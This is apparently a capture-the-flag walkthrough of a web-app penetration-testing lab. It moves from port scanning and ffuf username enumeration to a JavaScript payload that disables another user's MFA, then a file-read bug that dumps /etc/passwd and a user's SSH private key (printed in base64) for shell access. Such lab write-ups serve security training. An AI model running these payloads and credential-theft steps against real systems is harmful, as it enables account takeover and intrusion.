# Objective and scope
Hack Smarter is releasing a new SaaS platform for cloud storage. You have been hired to perform a full penetration test on the platform. The web app is in-scope, the client has also placed a "flag" on the machine. If this flag is retrieved, that is an immediate early disclosure as it demonstrates full compromise of the application.

The client has provisioned you with a standard user account

```python
Username: brian
Password: HackSmarter123!
```

During OSINT, your team identified a leaked password but are unsure of who it belongs to:

```python
cJ2yxWMs3XEHbO
```

Finally, they also gathered a list of potential usernames

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.1.74.45              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-21 18:17 +0100
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 75.42% done; ETC: 18:17 (0:00:08 remaining)
Nmap scan report for 10.1.74.45
Host is up (0.096s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 33.72 seconds
```

# HTTP (8080)

![](Pasted%20image%2020260821181936.png)

Landing page is a login form

`admin:admin` returns `Invalid username or password`, so no username enum from the error

![](Pasted%20image%2020260821182059.png)

![](Pasted%20image%2020260821182159.png)

The provided creds for `brian` got me logged in

![](Pasted%20image%2020260821184305.png)

There is an option to update the users, i could spray this paramter with the username list, i would assume the app wont let me modify the username to be the same as an existing user

# Username enumeration via the `update_profile` endpoint

First ill proxy the request to caido and send the request to automate

```python
ffuf -X POST -u http://embedded.hsm:8080/update_profile -H 'Cookie: session=eyJ1c2VyX2lkIjoxfQ.aoiJvg.kJHxJYBsY7mtOuDfmiF7tVhGhCA' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=FUZZ' -w usernames.txt -fs 2700-2820

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://embedded.hsm:8080/update_profile
 :: Wordlist         : FUZZ: /home/kali/hsm/embedded/usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: session=eyJ1c2VyX2lkIjoxfQ.aoiJvg.kJHxJYBsY7mtOuDfmiF7tVhGhCA
 :: Data             : username=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2700-2820
________________________________________________

tommy                   [Status: 200, Size: 2829, Words: 910, Lines: 74, Duration: 191ms]
:: Progress: [501/501] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Ill pass the method of POST and the URL with the correct HTTP headers then finally the data in the request, ill use the provided usernames list and filter out a response range

I find the user `tommy`

![](Pasted%20image%2020260821185506.png)

After trying it, i get the error telling me the user already exists

Ill try this user with the password retrieved from OSINT

I get access but this user has MFA enabled!

# Access as `tommy`

So i already know the password is correct, but i need the MFA code to get access to the dashboard

Ill log back into brian and play with the enabled MFA function

So enabling it doesnt do anything interesting, but disabling it calls an API

```python
POST /api/mfa/disable HTTP/1.1
Host: embedded.hsm:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://embedded.hsm:8080/dashboard
Origin: http://embedded.hsm:8080
Connection: keep-alive
Cookie: session=eyJ1c2VyX2lkIjoxfQ.aoiUtw.UXn5tt18leXKnrc3YlQ9jPAZssg
Priority: u=0
Content-Length: 0
```

It takes the session ID

![](Pasted%20image%2020260821191523.png)

My thinking is i can send a javascript payload to `tommy` to call the API and disable MFA

```javascript
<script>
var mfa = new XMLHttpRequest();
mfa.open('POST', '/api/mfa/disable', false);
mfa.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
mfa.send();
</script>
```

This will be the payload i use here

Ill enabled MFA on `brian`'s accounnt and try this in the dev tools console

![](Pasted%20image%2020260821193558.png)

![](Pasted%20image%2020260821193628.png)

Then after running it ill refresh the page

![](Pasted%20image%2020260821193649.png)

## Turning off `tommy`'s MFA

![](Pasted%20image%2020260821193759.png)

Ill send this request then i should be able to logon

## Dashboard as `tommy`

![](Pasted%20image%2020260821193906.png)

I am now logged in as tommy

I now have a `Generate Report` button the home screen

# Local File Inclusion (LFI)

![](Pasted%20image%2020260821194806.png)

Now i have new privs

I can also this to swap to raw HTLM

![](Pasted%20image%2020260821194909.png)

![](Pasted%20image%2020260821194918.png)

I can get XSS

If this works i can likely call files

![](Pasted%20image%2020260821195803.png)

Its calling the URL

![1336](Pasted%20image%2020260821200145.png)

I now have LFI

```python
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDo5OTg6OTk4OnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50Oi86L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4Ojk5Nzo5OTc6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbjovOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDo5OTY6OTk2OlN5c3RlbSBNZXNzYWdlIEJ1czovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4Ojk5NTo2NTUzNDpzc2hkIHVzZXI6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCnRvbW15Ong6MTAwMDoxMDAwOjovaG9tZS90b21teTovYmluL2Jhc2gK' | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:996:996:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:995:65534:sshd user:/run/sshd:/usr/sbin/nologin
tommy:x:1000:1000::/home/tommy:/bin/bash
```

Two users `tommy` and obviously `root`

# SSH access as `tommy`

![](Pasted%20image%2020260821200720.png)

I now have the contents of tommys private key

```python
echo 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJGd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFRRUFsWlNmVkxCOHQ5Z0ZmeHdQbEdpdm9rMVNiUjBRUXhPaXRNN2UxSFpSSWpQaXFqbFlUUEVWCkVGbXhHVU83Wmd2VVZXdmR5SmRLMU85R1BYOWZoYzVVdWRhbEF2Y3JLeTk4SThFM042WDdIRy9ZeW90N0RLNzhQL2NZMEoKSE02TFNGVzF5ZzN0K21yOUQxSHlJWEdZRmExbGRGUXo3azFuS1lKaHhaa0dnNDNzd0NraDRIODFkR0xENWNuSXQ1cXpqdwpnWVZRVjF5NTB0dGFoU01KT21vWnIwQUNPWE1LNlNpV1RzTkFNRFFzZ28zT1g5S0lFMm43NHBBK29STHBwVkpBeEdBaWxlCnpzcUtOTFhDSUZFajZobFEvbWNQMlpMRGlDWGxvSTc4aTArRXJ0RlE5TCtOeXBMTEhtTGo4R2lKZXNTcWdrUDRnT1BEL3QKQmlxdkdkRzlDUUFBQThnTXFYdnNES2w3N0FBQUFBZHpjMmd0Y25OaEFBQUJBUUNWbEo5VXNIeTMyQVYvSEErVWFLK2lUVgpKdEhSQkRFNkswenQ3VWRsRWlNK0txT1ZoTThSVVFXYkVaUTd0bUM5UlZhOTNJbDByVTcwWTlmMStGemxTNTFxVUM5eXNyCkwzd2p3VGMzcGZzY2I5aktpM3NNcnZ3Lzl4alFrY3pvdElWYlhLRGUzNmF2MFBVZkloY1pnVnJXVjBWRFB1VFdjcGdtSEYKbVFhRGplekFLU0hnZnpWMFlzUGx5Y2kzbXJPUENCaFZCWFhMblMyMXFGSXdrNmFobXZRQUk1Y3dycEtKWk93MEF3TkN5QwpqYzVmMG9nVGFmdmlrRDZoRXVtbFVrREVZQ0tWN095b28wdGNJZ1VTUHFHVkQrWncvWmtzT0lKZVdnanZ5TFQ0U3UwVkQwCnY0M0trc3NlWXVQd2FJbDZ4S3FDUS9pQTQ4UCswR0txOFowYjBKQUFBQUF3RUFBUUFBQVFBcXFZMFlGbzQ3MFQwZ0Y5ekoKczJJRXBKRVIxZXhCZFdRK3RaSVFmdjU5QnRkclBaZlZ1aDBMNE1rR0w2OVBWNmhrQkxQbzlsMjloZEUrMFFscG5JUEZ6VgphYkZld1dFU0VUQVpUQ0puRU1sMG41MnZacGs2OFdmMTl3ZldVNEtlU3ZQaWdUNlM0ZGp6ZWFmWnFoQjZmazRsYzY2c0ZSCitMVTBpWGx5R29lOTQzb2ZVYkV6cEh6VjV6ZlRoTWJmaWp2TFN0UUdWMXR5cHZwTlBzTktQMWV6YlVxR1F2NkdjWEtHRmsKcWVLSmpiMnFTRGdvYm0wWDFYZ0tiV1c4Z3MwdzdHTUdOczM1WTlQRUZQMTBTMjR2Sks1L3pWaEpHcGZ6OVZYTGxiRG1kbgpNWGdBaTlwejV5QStlZndhY3lET0pwL1dHU0hzR1FJMDdFRFVJV2FkRkVCUkFBQUFnUUNwVVVobUZid2NGZmZFVDBHbWVUCkdDQ1dIclg0TlFIWkZRSTdzQkVPVDFQdnRrZEtRVTd5TnhOZUttTEREaktjL3o3SHdVa25hTkREalhLTWZkSkxnVlBDU0gKekZmcVI4cERtUFJjTStBMlRoYkNVNHZjMGNBVWFMa3ZtekUrRTRaeCtEb0NYSm55OVVsRkNkT3V4UG95Tmo4eWdDMENZWApBUE91Q2pUNDRVR0FBQUFJRUEwaWlxTVdmeEFVRWt6THRsR2dja3FsRDZ5dlE1QjVsbzJtTllBeEFsQU1PVmIya0poL240Ckkvak45Q0VnV3Nxc2p5M2ltUkV2MCtrVVppQWtNdndLVlpTTUc4bHJaSnBRTW5WVUI2ZHJqNHdIRVJURXJGbWpLOWlRY0IKWU95SW5OaTdyK3YwZHlqam1NSVEwSitKazZDcVB2YzZOUU9nUlJrbnJqNi82bk1KOEFBQUNCQUxZMVB6MU1mRmNTMFErSwphNlFkZG5ROXRUVEpKMG1Qem5lL1IyMncxYzZLMmYwWlRxZzR3MDVaa0F5Qk0yTTNGNlFoV2VmQ1NsQ2NHMGxRb2dtbUhUCkdRemlTSFZDNzN4bE5NZVR1N0IvbDNuQmZZajJJeG5ubXZUK01qazZiSDRpTUpReEt4OE5Cc1dmRlZYdmsxcU80NlN3T3kKNmExWjNOcWU5N3BPa1dsWEFBQUFFWEp2YjNSQU1tUXhOall3TnpnM056aGlBUT09Ci0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d | tee id_rsa | chmod 600 id_rsa
```

Ill put it into a file and change the perms

```python
ssh tommy@embedded.hsm -p 2222 -i id_rsa 
The authenticity of host '[embedded.hsm]:2222 ([10.1.74.45]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:ys+PG5Ueh13Zt0bBxqpb5W87L7/pgZKmPA5Gh6AQaVA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[embedded.hsm]:2222' (ED25519) to the list of known hosts.
'Linux fcde7e46a443 6.17.0-1019-aws #19~24.04.1-Ubuntu SMP Tue Jun 23 18:53:06 UTC 2026 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
-bash: warning: setlocale: LC_CTYPE: cannot change locale (en_US.UTF-8): No such file or directory
-bash: warning: setlocale: LC_CTYPE: cannot change locale (en_US.UTF-8): No such file or directory
-bash: warning: setlocale: LC_COLLATE: cannot change locale (en_US.UTF-8): No such file or directory
-bash: warning: setlocale: LC_CTYPE: cannot change locale (en_US.UTF-8): No such file or directory
-bash: warning: setlocale: LC_CTYPE: cannot change locale (en_US.UTF-8): No such file or directory
-bash: warning: setlocale: LC_COLLATE: cannot change locale (en_US.UTF-8): No such file or directory
-bash: warning: setlocale: LC_CTYPE: cannot change locale (en_US.UTF-8): No such file or directory
-bash: warning: setlocale: LC_CTYPE: cannot change locale (en_US.UTF-8): No such file or directory
-bash: warning: setlocale: LC_COLLATE: cannot change locale (en_US.UTF-8): No such file or directory
-bash: warning: setlocale: LC_CTYPE: cannot change locale (en_US.UTF-8): No such file or directory
-bash: warning: setlocale: LC_CTYPE: cannot change locale (en_US.UTF-8): No such file or directory
-bash: warning: setlocale: LC_COLLATE: cannot change locale (en_US.UTF-8): No such file or directory
tommy@fcde7e46a443:~$
```

Now i can get the flag and finish the challenge


